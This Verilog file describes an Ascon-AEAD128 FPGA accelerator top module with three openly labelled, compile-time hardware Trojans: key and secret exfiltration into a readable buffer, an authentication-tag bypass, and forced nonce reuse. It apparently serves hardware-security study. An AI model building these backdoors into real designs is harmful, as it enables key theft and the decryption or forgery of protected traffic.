// crypto_top.v - Ascon-AEAD128 accelerator top: buffers, EEPROM-provisioned
// key material, command/status interface, and (optionally) hardware Trojans.
//
// The command interface here is the clean parallel register view of the SPI
// command protocol documented in ice40_crypto_ip.md (WRITE/READ/START/STATUS,
// CFG op + nonce source, buffer map). spi_peripheral.v wraps this for the board.
//
// Trojans are compile-time options (do not affect the clean build):
//   TROJAN_A  magic-nonce -> device-secret exfiltration into OUT
//   TROJAN_B  magic-AD    -> authentication-tag bypass on decrypt
//   TROJAN_C  magic-MSG   -> nonce override (forced reuse, weakens confidentiality)
`default_nettype none

module crypto_top (
    input  wire         clk,
    input  wire         rst_n,
    // provisioning image latched from EEPROM (loader/eeprom model supplies it)
    input  wire         prov_valid,
    input  wire [127:0] prov_key,
    input  wire [127:0] prov_nonce,
    input  wire [127:0] prov_secret,
    // command/register interface (parallel view of the SPI protocol)
    input  wire         cmd_we,      // write a buffer byte
    input  wire [15:0]  cmd_waddr,
    input  wire [7:0]   cmd_wdata,
    input  wire [15:0]  cmd_raddr,   // combinational buffer read
    output reg  [7:0]   cmd_rdata,
    input  wire         start,       // 1-cycle: begin op
    input  wire [7:0]   cfg,         // [1:0]=op [3:2]=nonce source
    input  wire [9:0]   adlen,
    input  wire [9:0]   msglen,
    output wire [7:0]   status,
    // side-channel / indicator outputs (also the scope-trigger)
    output wire         ice_led
);
    // ---- buffers ----
    reg [7:0] admem  [0:511];
    reg [7:0] msgmem [0:511];
    reg [7:0] outmem [0:511];
    reg [7:0] tagin  [0:15];
    reg [7:0] tagout [0:15];
    reg [7:0] noncein[0:15];

    // ---- provisioned secrets held inside the FPGA ----
    reg [127:0] r_key, r_nonce, r_secret;
    reg         keys_loaded;
    reg         withhold;      // when set, OUT reads back as zeros (auth fail)

    // ---- status ----
    reg eng_done, eng_auth_ok, eng_auth_fail;
    wire eng_busy;
    // status bit0 BUSY,1 DONE,2 AUTH_OK,3 AUTH_FAIL,4 KEYS_LOADED,5 EEPROM_ERR,6 CMD_ERR,7=1
    // (assembled at the bottom of the module)

    // ---- command op latches ----
    reg [1:0] op_l;
    reg [1:0] nsrc_l;
    reg [9:0] adlen_l, msglen_l;
    reg       go;

    // effective nonce per cfg nonce-source
    reg [127:0] host_nonce;
    integer hb;
    always @* begin
        host_nonce = 128'b0;
        for (hb=0;hb<16;hb=hb+1) host_nonce[127-8*hb -: 8] = noncein[hb];
    end
    reg [127:0] eff_nonce;

    // ---- Trojan trigger detection (latched at start) ----
    reg trjA_fire, trjB_fire, trjC_fire;
    wire [31:0] ad0 = {admem[0],admem[1],admem[2],admem[3]};
    wire [31:0] msg0= {msgmem[0],msgmem[1],msgmem[2],msgmem[3]};
    localparam [127:0] MAGIC_NONCE = {16{8'hA5}};       // Trojan-A trigger
    localparam [31:0]  MAGIC_AD    = 32'hDEADBEEF;       // Trojan-B trigger
    localparam [31:0]  MAGIC_MSG   = 32'hC0FFEE00;       // Trojan-C trigger
    localparam [127:0] FIXED_NONCE = 128'h0;             // Trojan-C payload nonce

    // ---- engine wiring ----
    wire [9:0]  rd_blk;
    reg  [127:0] ad_block, msg_block;
    wire        out_we;
    wire [9:0]  out_blk;
    wire [127:0] out_block;
    wire [127:0] eng_tag;
    wire        eng_done_w, eng_ok_w, eng_fail_w;
    reg  [127:0] tagin_w;
    integer tb;
    always @* begin
        tagin_w = 128'b0;
        for (tb=0;tb<16;tb=tb+1) tagin_w[127-8*tb -: 8] = tagin[tb];
    end

    // wide block reads (assemble 16 bytes big-endian; secret routed for op=3)
    integer rp; reg [9:0] rbase;
    always @* begin
        rbase = {rd_blk[5:0],4'b0};
        ad_block = 128'b0; msg_block = 128'b0;
        for (rp=0;rp<16;rp=rp+1) begin
            ad_block[127-8*rp -: 8]  = admem[rbase+rp[9:0]];
            msg_block[127-8*rp -: 8] = msgmem[rbase+rp[9:0]];
        end
        if (op_l==2'd3) msg_block = (rd_blk==0) ? r_secret : 128'b0;
    end

    wire force_auth_w;
`ifdef TROJAN_B
    assign force_auth_w = trjB_fire;
`else
    assign force_auth_w = 1'b0;
`endif

    ascon_engine u_eng (
        .clk(clk), .rst_n(rst_n), .start(go),
        .op(op_l), .ad_len(adlen_l), .msg_len(msglen_l),
        .key(r_key), .nonce(eff_nonce),
        .rd_blk(rd_blk), .ad_block(ad_block), .msg_block(msg_block),
        .out_we(out_we), .out_blk(out_blk), .out_block(out_block),
        .tag_in(tagin_w), .force_auth(force_auth_w), .tag_out(eng_tag),
        .busy(eng_busy), .done(eng_done_w), .auth_ok(eng_ok_w), .auth_fail(eng_fail_w)
    );

    // ---- buffer writes (command + engine OUT + tag capture) ----
    integer wp, cp;
    reg [7:0] wa_region;
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            keys_loaded<=0; go<=0; eng_done<=0; eng_auth_ok<=0; eng_auth_fail<=0; withhold<=0;
            op_l<=0; nsrc_l<=0; adlen_l<=0; msglen_l<=0;
            trjA_fire<=0; trjB_fire<=0; trjC_fire<=0;
        end else begin
            go<=0;
            // provisioning latch
            if (prov_valid && !keys_loaded) begin
                r_key<=prov_key; r_nonce<=prov_nonce; r_secret<=prov_secret;
                keys_loaded<=1;
            end
            // command buffer write
            if (cmd_we) begin
                if      (cmd_waddr < 16'h200) admem [cmd_waddr[8:0]]        <= cmd_wdata;
                else if (cmd_waddr < 16'h400) msgmem[cmd_waddr[8:0]]        <= cmd_wdata;
                else if (cmd_waddr < 16'h600) outmem[cmd_waddr[8:0]]        <= cmd_wdata;
                else if (cmd_waddr < 16'h610) tagin [cmd_waddr[3:0]]        <= cmd_wdata;
                else if (cmd_waddr < 16'h620) tagout[cmd_waddr[3:0]]        <= cmd_wdata;
                else                          noncein[cmd_waddr[3:0]]       <= cmd_wdata;
            end
            // start an operation
            if (start && keys_loaded && !eng_busy) begin
                op_l   <= cfg[1:0];
                nsrc_l <= cfg[3:2];
                adlen_l<= adlen;
                msglen_l<=msglen;
                // effective nonce
                case (cfg[3:2])
                    2'd0: eff_nonce <= r_nonce;
                    2'd1: eff_nonce <= host_nonce;
                    2'd2: eff_nonce <= r_nonce ^ host_nonce;
                    default: eff_nonce <= r_nonce;
                endcase
                // trigger latches
                trjA_fire <= (host_nonce==MAGIC_NONCE) && (cfg[1:0]==2'd1);
                // Trojan B trigger = reserved CFG bit 7 on a decrypt. Unlike an AD
                // trigger (AD participates in decryption and would corrupt the
                // result), a reserved control bit leaves the datapath untouched,
                // so the CORRECT plaintext of ANY captured ciphertext is released
                // with only a bogus tag -> confidentiality break (C:H), not just
                // integrity. The bit is 0 in all normal/self-test traffic.
                trjB_fire <= cfg[7] && (cfg[1:0]==2'd2);
                trjC_fire <= (msg0==MAGIC_MSG) && (cfg[1:0]==2'd1);
`ifdef TROJAN_C
                if ((msg0==MAGIC_MSG) && (cfg[1:0]==2'd1)) eff_nonce <= FIXED_NONCE;
`endif
                eng_done<=0; eng_auth_ok<=0; eng_auth_fail<=0; withhold<=0;
                go<=1;
            end
            // engine OUT write
            if (out_we) begin
                for (wp=0;wp<16;wp=wp+1)
                    outmem[{out_blk[5:0],4'b0}+wp[9:0]] <= out_block[127-8*wp -: 8];
            end
            // completion
            if (eng_done_w) begin
                eng_done<=1; eng_auth_ok<=eng_ok_w; eng_auth_fail<=eng_fail_w;
                // capture produced tag
                for (cp=0;cp<16;cp=cp+1) tagout[cp] <= eng_tag[127-8*cp -: 8];
                // withhold plaintext on auth fail (OUT reads back as zeros) via a
                // flag instead of clearing 512 bytes -> far smaller footprint
                if (op_l==2'd2 && eng_fail_w) withhold<=1;
`ifdef TROJAN_A
                // payload: leak the FULL provisioned material across the FPGA's
                // isolation boundary into the host-readable OUT buffer:
                //   OUT[0:15]=key  OUT[16:31]=nonce/IV  OUT[32:47]=device secret
                // With the key the host can decrypt captured traffic AND forge
                // ciphertexts the accelerator accepts (see tb demo).
                if (trjA_fire)
                    for (cp=0;cp<16;cp=cp+1) begin
                        outmem[cp]      <= r_key   [127-8*cp -: 8];
                        outmem[16+cp]   <= r_nonce [127-8*cp -: 8];
                        outmem[32+cp]   <= r_secret[127-8*cp -: 8];
                    end
`endif
            end
        end
    end

    // ---- combinational buffer read ----
    always @* begin
        if      (cmd_raddr < 16'h200) cmd_rdata = admem [cmd_raddr[8:0]];
        else if (cmd_raddr < 16'h400) cmd_rdata = msgmem[cmd_raddr[8:0]];
        else if (cmd_raddr < 16'h600) cmd_rdata = withhold ? 8'h00 : outmem[cmd_raddr[8:0]];
        else if (cmd_raddr < 16'h610) cmd_rdata = tagin [cmd_raddr[3:0]];
        else if (cmd_raddr < 16'h620) cmd_rdata = tagout[cmd_raddr[3:0]];
        else                          cmd_rdata = noncein[cmd_raddr[3:0]];
    end

    assign status = {1'b1,1'b0,1'b0,keys_loaded,eng_auth_fail,eng_auth_ok,eng_done,eng_busy};
    assign ice_led = eng_busy;
endmodule
`default_nettype wire
